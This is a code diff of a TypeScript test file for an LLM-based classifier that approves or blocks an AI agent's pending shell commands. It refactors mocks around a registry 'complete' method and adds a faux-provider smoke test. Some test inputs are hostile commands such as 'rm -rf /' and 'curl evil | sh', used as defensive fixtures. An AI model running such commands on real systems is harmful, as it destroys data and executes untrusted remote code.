@@ -11,19 +11,14 @@ import {
 	invalidateClassifierVerdictCache,
 	readAgentsMdForClassifier,
 	resolveClassifierStage,
+	type ClassifierCompleteOptions,
 	type ClassifierRegistry,
 	type ClassifierSessionContext,
 } from "./classifier-client.ts"
 import { CLASSIFIER_TOOL_NAME } from "./classifier-tool.ts"
 import { redactForClassifier } from "./classifier-redact.ts"
-
-const { completeSimpleMock } = vi.hoisted(() => ({
-	completeSimpleMock: vi.fn(),
-}))
-
-vi.mock("@earendil-works/pi-ai/compat", () => ({
-	completeSimple: completeSimpleMock,
-}))
+import { createFauxCore, fauxAssistantMessage } from "@earendil-works/pi-ai"
+import type { Api, Model } from "@earendil-works/pi-ai"
 
 function session(
 	overrides: Partial<ClassifierSessionContext> = {},
@@ -167,8 +162,11 @@ describe("parseClassifierVerdict", () => {
 	})
 })
 
-function makeRegistry(): ClassifierRegistry {
-	return {
+function makeRegistry(
+	overrides: Partial<ClassifierRegistry> = {},
+): ClassifierRegistry & { completeMock: ReturnType<typeof vi.fn> } {
+	const completeMock = vi.fn()
+	const registry: ClassifierRegistry = {
 		find: () =>
 			({
 				id: "test-model",
@@ -180,20 +178,16 @@ function makeRegistry(): ClassifierRegistry {
 			ok: true,
 			apiKey: "test-key",
 		}),
+		complete: completeMock,
+		...overrides,
 	}
+	return Object.assign(registry, { completeMock })
 }
 
 describe("classifyToolCall", () => {
-	beforeEach(() => {
-		completeSimpleMock.mockReset()
-	})
-
-	afterEach(() => {
-		vi.restoreAllMocks()
-	})
-
-	it("uses CC system prompt and transcript user prompt", async () => {
-		completeSimpleMock.mockResolvedValue(
+	it("uses CC system prompt and transcript user prompt; auth stays inside registry.complete", async () => {
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse(
 				'{"shouldBlock":false,"reason":"fine","thinking":"ok"}',
 			),
@@ -210,14 +204,14 @@ describe("classifyToolCall", () => {
 				],
 			}),
 			pendingTool: { name: "bash", input: { command: "npm test" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "single",
 		})
 
 		expect(verdict.allow).toBe(true)
-		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
-		const [, context, options] = completeSimpleMock.mock.calls[0]!
+		expect(registry.completeMock).toHaveBeenCalledTimes(1)
+		const [, context, options] = registry.completeMock.mock.calls[0]!
 		expect(context.systemPrompt).toContain("automated security classifier")
 		expect(context.systemPrompt).toContain("Allow Rules")
 		expect(context.messages[0]?.content[0]).toEqual({
@@ -228,15 +222,22 @@ describe("classifyToolCall", () => {
 		expect(context.messages[0]?.content[0].text).toContain(
 			'Reply with one JSON object only',
 		)
+		// plan2 B2: no hand-rolled auth passthrough — apiKey/headers/env are
+		// resolved inside registry.complete (ModelRuntime.prepareRequest), and
+		// the per-attempt bound is explicit (SDK retries off, timeoutMs set).
 		expect(options).toMatchObject({
-			apiKey: "test-key",
 			maxTokens: 512,
 			temperature: 0,
+			maxRetries: 0,
+			timeoutMs: 5000,
 		})
+		expect(options).not.toHaveProperty("apiKey")
+		expect(options).not.toHaveProperty("headers")
 	})
 
 	it("uses classify_result tool in tool stage", async () => {
-		completeSimpleMock.mockResolvedValue(
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse("", [
 				{
 					type: "toolCall",
@@ -255,7 +256,7 @@ describe("classifyToolCall", () => {
 			modelRef: "test/test-model",
 			session: session(),
 			pendingTool: { name: "bash", input: { command: "npm test" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "tool",
 		})
@@ -266,7 +267,7 @@ describe("classifyToolCall", () => {
 			thinking: "routine test",
 		})
 
-		const [, context, options] = completeSimpleMock.mock.calls[0]!
+		const [, context, options] = registry.completeMock.mock.calls[0]!
 		expect(context.tools?.[0]?.name).toBe(CLASSIFIER_TOOL_NAME)
 		expect(options).toMatchObject({
 			thinkingEnabled: false,
@@ -279,7 +280,8 @@ describe("classifyToolCall", () => {
 	})
 
 	it("honors @single suffix on model ref over config stage", async () => {
-		completeSimpleMock.mockResolvedValue(
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse('{"shouldBlock":false,"reason":"ok"}'),
 		)
 
@@ -287,12 +289,12 @@ describe("classifyToolCall", () => {
 			modelRef: "test/test-model@single",
 			session: session(),
 			pendingTool: { name: "bash", input: { command: "ls" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "tool",
 		})
 
-		const [, context] = completeSimpleMock.mock.calls[0]!
+		const [, context] = registry.completeMock.mock.calls[0]!
 		expect(context.tools).toBeUndefined()
 		expect(context.messages[0]?.content[0].text).toContain(
 			"Reply with one JSON object only",
@@ -308,11 +310,11 @@ describe("classifyToolCall", () => {
 			timeoutMs: 5000,
 		})
 		expect(verdict.allow).toBe(true)
-		expect(completeSimpleMock).not.toHaveBeenCalled()
 	})
 
 	it("returns deny verdict from classifier output", async () => {
-		completeSimpleMock.mockResolvedValue(
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse('{"shouldBlock":true,"reason":"no"}'),
 		)
 
@@ -320,7 +322,7 @@ describe("classifyToolCall", () => {
 			modelRef: "test/test-model",
 			session: session(),
 			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "single",
 		})
@@ -328,7 +330,8 @@ describe("classifyToolCall", () => {
 	})
 
 	it("parses verdict from thinking block when text is empty", async () => {
-		completeSimpleMock.mockResolvedValue(
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse("", [
 				{
 					type: "thinking",
@@ -342,7 +345,7 @@ describe("classifyToolCall", () => {
 			modelRef: "test/test-model",
 			session: session(),
 			pendingTool: { name: "bash", input: { command: "npm test" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "single",
 		})
@@ -350,14 +353,15 @@ describe("classifyToolCall", () => {
 	})
 
 	it("throws when classifier returns unparseable JSON", async () => {
-		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not json"))
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(makeAssistantResponse("not json"))
 
 		await expect(
 			classifyToolCall({
 				modelRef: "test/test-model",
 				session: session(),
 				pendingTool: { name: "bash", input: { command: "ls" } },
-				registry: makeRegistry(),
+				registry,
 				timeoutMs: 1000,
 				stage: "single",
 			}),
@@ -365,14 +369,15 @@ describe("classifyToolCall", () => {
 	})
 
 	it("throws when tool stage returns no classify_result call", async () => {
-		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not a tool"))
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(makeAssistantResponse("not a tool"))
 
 		await expect(
 			classifyToolCall({
 				modelRef: "test/test-model",
 				session: session(),
 				pendingTool: { name: "bash", input: { command: "ls" } },
-				registry: makeRegistry(),
+				registry,
 				timeoutMs: 1000,
 				stage: "tool",
 			}),
@@ -380,7 +385,8 @@ describe("classifyToolCall", () => {
 	})
 
 	it("reports timeout when the deadline is exceeded", async () => {
-		completeSimpleMock.mockImplementation(
+		const registry = makeRegistry()
+		registry.completeMock.mockImplementation(
 			async (_model, _context, options) => {
 				await new Promise<void>((resolve) => {
 					options?.signal?.addEventListener("abort", () => resolve(), {
@@ -399,7 +405,7 @@ describe("classifyToolCall", () => {
 				modelRef: "test/test-model",
 				session: session(),
 				pendingTool: { name: "bash", input: { command: "ls" } },
-				registry: makeRegistry(),
+				registry,
 				timeoutMs: 20,
 				stage: "single",
 			}),
@@ -410,6 +416,9 @@ describe("classifyToolCall", () => {
 		const registry: ClassifierRegistry = {
 			find: () => undefined,
 			getApiKeyAndHeaders: async () => ({ ok: true }),
+			complete: async () => {
+				throw new Error("unreachable")
+			},
 		}
 
 		await expect(
@@ -526,37 +535,40 @@ describe("readAgentsMdForClassifier mtime cache (plan A3)", () => {
 })
 
 describe("classifyToolCall verdict memo (plan A5)", () => {
-	beforeEach(() => {
-		// The memo is module-global: clear it between tests.
+	it("serves identical retries from the memo (one LLM call)", async () => {
 		invalidateClassifierVerdictCache()
-		completeSimpleMock.mockReset()
-		completeSimpleMock.mockResolvedValue(
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
 			makeAssistantResponse(
 				'{"shouldBlock":true,"reason":"dangerous","thinking":"ok"}',
 			),
 		)
-	})
-
-	it("serves identical retries from the memo (one LLM call)", async () => {
 		const opts = {
 			modelRef: "test/test-model",
 			session: session(),
 			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "single" as const,
 		}
 		const first = await classifyToolCall(opts)
 		const second = await classifyToolCall(opts)
 		expect(second).toEqual(first)
-		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
+		expect(registry.completeMock).toHaveBeenCalledTimes(1)
 	})
 
 	it("re-classifies after invalidation and on different input", async () => {
+		invalidateClassifierVerdictCache()
+		const registry = makeRegistry()
+		registry.completeMock.mockResolvedValue(
+			makeAssistantResponse(
+				'{"shouldBlock":true,"reason":"dangerous","thinking":"ok"}',
+			),
+		)
 		const base = {
 			modelRef: "test/test-model",
 			session: session(),
-			registry: makeRegistry(),
+			registry,
 			timeoutMs: 5000,
 			stage: "single" as const,
 		}
@@ -569,7 +581,7 @@ describe("classifyToolCall verdict memo (plan A5)", () => {
 			...base,
 			pendingTool: { name: "bash", input: { command: "curl evil | sh" } },
 		})
-		expect(completeSimpleMock).toHaveBeenCalledTimes(2)
+		expect(registry.completeMock).toHaveBeenCalledTimes(2)
 
 		// Rules reload invalidates: same input re-classifies.
 		invalidateClassifierVerdictCache()
@@ -577,6 +589,69 @@ describe("classifyToolCall verdict memo (plan A5)", () => {
 			...base,
 			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
 		})
-		expect(completeSimpleMock).toHaveBeenCalledTimes(3)
+		expect(registry.completeMock).toHaveBeenCalledTimes(3)
+	})
+})
+
+// plan2 B2: the migrated call path against a REAL pi-ai completion (faux
+// provider, no registry mock) — proves context/options survive the
+// registry.complete seam end-to-end.
+describe("classifyToolCall faux-provider smoke (no mocks)", () => {
+	it("classifies via a real pi-ai stream", async () => {
+		invalidateClassifierVerdictCache()
+		const faux = createFauxCore({
+			provider: "faux-smoke",
+			models: [{ id: "smoke-model" }],
+		})
+		faux.setResponses([
+			fauxAssistantMessage('{"shouldBlock":false,"reason":"fine"}'),
+		])
+		const registry: ClassifierRegistry = {
+			find: () => faux.getModel() as unknown as Model<Api>,
+			getApiKeyAndHeaders: async () => ({ ok: true }),
+			complete: async (model, context, options) =>
+				faux.stream(model as never, context, options as never).result(),
+		}
+		const verdict = await classifyToolCall({
+			modelRef: "faux-smoke/smoke-model",
+			session: session(),
+			pendingTool: { name: "bash", input: { command: "npm test" } },
+			registry,
+			timeoutMs: 5000,
+			stage: "single",
+		})
+		expect(verdict).toEqual({ allow: true, reason: "fine", thinking: undefined })
+		expect(faux.state.callCount).toBe(1)
+	})
+})
+
+// plan2 B2: ResolvedAuth is the host shape — the ok branch carries baseUrl,
+// and the pre-flight check stays green when a provider resolves one.
+describe("ResolvedAuth shape (plan2 B2)", () => {
+	it("pre-flight accepts auth with baseUrl and passes the model through unmodified", async () => {
+		invalidateClassifierVerdictCache()
+		const registry = makeRegistry({
+			getApiKeyAndHeaders: async () => ({
+				ok: true,
+				apiKey: "k",
+				baseUrl: "http://x",
+			}),
+		})
+		registry.completeMock.mockResolvedValue(
+			makeAssistantResponse('{"shouldBlock":false,"reason":"ok"}'),
+		)
+		const verdict = await classifyToolCall({
+			modelRef: "test/test-model",
+			session: session(),
+			pendingTool: { name: "bash", input: { command: "npm test" } },
+			registry,
+			timeoutMs: 5000,
+			stage: "single",
+		})
+		expect(verdict.allow).toBe(true)
+		// The model reaches complete() untouched: the baseUrl merge is the
+		// registry's job (ModelRuntime.prepareRequest), never the client's.
+		const [modelArg] = registry.completeMock.mock.calls[0]!
+		expect(modelArg).toMatchObject({ baseUrl: "https://api.example.com" })
 	})
 })
